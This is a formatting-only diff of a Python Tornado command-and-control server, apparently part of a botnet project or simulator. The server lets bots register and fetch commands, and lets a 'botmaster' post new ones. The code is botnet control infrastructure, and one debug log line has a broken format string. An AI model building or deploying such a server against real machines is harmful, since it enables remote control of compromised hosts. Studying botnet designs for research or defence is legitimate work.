@@ -19,6 +19,7 @@ from utils.LogfileParser import writeLogentry
 
 _registered_bots = dict()
 
+
 def make_app():
     """Starts the web interface that is used to interact with this server."""
     handlers = [("/", MainHandler), ("/register", RegisterHandler), ("/current_command", CurrentCommandHandler)]
@@ -41,6 +42,7 @@ class MainHandler(tornado.web.RequestHandler):
                        "/register where clients can register themselves so we can keep track of them."
                        "/current_command where clients can retrieve commands that they should execute")
 
+
 class CurrentCommandHandler(tornado.web.RequestHandler):
     """A handler that lets clients fetch the current command via HTTP GET and lets the botmaster issue a new command via
     HTTP POST."""
@@ -55,21 +57,21 @@ class CurrentCommandHandler(tornado.web.RequestHandler):
             self.set_header("Content-Type", "text/plain")
             if not self.current_command == {}:
                 self.write(
-                    "%s: %s" % (self.current_command["command"], " ".join(self.current_command["kwargs"].values())))
+                    "%s: %s"%(self.current_command["command"], " ".join(self.current_command["kwargs"].values())))
 
     def post(self):
-        logging.debug('%s != %s == %s' % (self.get_body_argument("command"), self.current_command["command"],
-                                          self.get_body_argument("command") != self.current_command["command"]))
+        logging.debug('%s != %s == %s'%(self.get_body_argument("command"), self.current_command["command"],
+                                        self.get_body_argument("command") != self.current_command["command"]))
         if self.get_body_argument("command") != self.current_command["command"]:
             # noinspection PyBroadException
             old_command = self.current_command
             try:
                 self.current_command["command"] = self.get_body_argument("command")
                 self.current_command["kwargs"] = json.loads(self.get_body_argument("kwargs"))
-                logging.debug("The CnC-Server has received a new command: " % self.current_command)
+                logging.debug("The CnC-Server has received a new command: "%self.current_command)
             except:
                 # rolls the change back
-                logging.warning("Command could not be applied: body_arguments = %s" % self.get_body_arguments())
+                logging.warning("Command could not be applied: body_arguments = %s"%self.get_body_arguments())
                 self.current_command = old_command
 
         self.set_header("Content-Type", "text/plain")
@@ -142,7 +144,7 @@ class CnCServer(Runnable):
             app.listen(self.port)
             IOLoop.current().start()
         except socket.error as ex:
-            logging.warning("Could not start the CnC-Server: %s" % ex)
+            logging.warning("Could not start the CnC-Server: %s"%ex)
 
     def stop(self):
         """Implements stop() from the superclass."""
